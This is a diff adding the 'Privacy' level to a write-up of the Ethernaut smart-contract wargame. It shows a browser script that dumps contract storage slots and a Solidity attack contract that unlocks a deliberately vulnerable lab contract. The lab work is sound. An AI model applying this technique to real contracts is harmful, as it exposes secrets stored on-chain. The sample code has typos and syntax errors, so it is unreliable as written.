@@ -17,6 +17,7 @@ Sections:
  - [King](#9-king)
  - [Re-entrancy](#10-re-entrancy)
  - [Elevator](#11-elevator)
+ - [Privacy](#12-privacy)
 
 ----
 
@@ -848,7 +849,114 @@ contract.address()
 We bascially added a new logic for the interface function because the interface allows us to modify the state. 
 
 ---
-### 12. NAME 
+### 12. Privacy 
+
+> The creator of this contract was careful enough to protect the sensitive areas of its storage.
+
+> Unlock this contract to beat the level.
+
+So, we're going to have to unlock the contract in order to pass the level. 
+
+Let's cover some of the basics needed for the challenge and then the smart contract.
+- Casting: In solidity you need to define the type of the varibale. Its a static language. 
+https://www.tutorialspoint.com/solidity/solidity_conversions.htm
+- Web3 provider: metamask is a user wallet that injects and object called web3 to comunicate to the blokchain. 
+
+The contract has different variables and not many functions. It only has a contructor and a function called unlock. When we pass the right key into the unlock funtion, then we can unlock the lock. The goal is to get the last elment in the data array. (index starts at 0)
+
+Storing sensitive information on a blockchain is not a good idea, anyone can retriev it. You can hash it but then you need to keep your keys safe. 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Privacy {
+
+  bool public locked = true; // first state variable 
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data; // declares an array of size 3 
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2])); // if it equals the last element of thr data array 
+    locked = false; // unlock the lock :-) 
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+
+``` 
+checkout the: contract.abi
+
+All state varibales in a smart contract are there for anyone to read, even the private ones. In Ethereum the code, and so the variables are stored in slots. The more storage space a smart ocntract consumes the more gas it consumes, so as a contract developer you need to opimitize the space you use for your contract. You should optimize the posisiton of your variables to optimize for gas (you can remove the need to have an extra slot). 
+
+####  Solution:
+Since all the variables are stored in slots, when we figure out which slot to get we can get the last variable on the data array. Passing this variable will allow us to unlock the contract. Let's query everything in the contract. 
+1. web3.eth.getStorageAt(SLOT_TO_QUERY). 
+2. Instead of trying one by one here is a script to query and give us all the data in the storage:
+```
+let storgae = []
+
+let callBackFNConstructor = (index) => (error, contractData) => {
+ storage[index] = contractData
+}
+
+for (var i = 0, i<6) { // 6 because there is a max 6 variables in storage 
+ web3.eth.getStorageAt(contract.address, i, callBackFNConstructor)
+}
+``` 
+Copy and paste in your browser. The storage array should be populated that represents the slots. 
+3. On index 3 there are 3 variables:
+- 265: ff 
+- 10: 0a
+- awkwardness: 9cb3 
+Solidity was able to optmize and fit the 3 variables in one. 
+
+The last 3 slots represent the data array. Each element in the array has its own slot. So we know that to unlock the contract we need the last item on the index array. It is the last element on the storage array, index: 5
+storage[5] // this is the element that we need to convert to a byte format. 
+4. Go to remix and create an attack contract. This attack contract will call the privacy contract and pass the value in the unlock function. 
+5. Copy the Privacy contract, we will import it on our attack contract. 
+5. Here is how our attack contract should look like. 
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+import './Privacy.sol';
+
+contract PrivacyAttack {
+  Privacy target;
+
+  constructor(address _targetAddress) public {
+    target = Privacy(_targetAddress);
+  }
+  function unlock(byte32 _slotValue) public{
+     byte16 key = byte16(_slotValue); //type conversion in solidity, aka: casting 
+     target.unlock(key);
+  }
+  
+}
+``` 
+6. Deploy the privacy attack contract with teh address of the deployed Privacy contract 
+7. Execute the unlock function with the key at storage[5] (its the last slot on the Privacy contract)
+await contract.locked()
+
+Lesson learned: if you store data on the blockchain its viewable by everybody. nothing is ever private on a blockchain. the way you declare the varaiable defines how much storage space it will take up. 
+
+---
+### 13. NAME 
 
 > Challange 
 
@@ -857,3 +965,4 @@ We bascially added a new logic for the interface function because the interface 
 pragma solidity ^0.6.0;
 
 ``` 
+####  Solution:
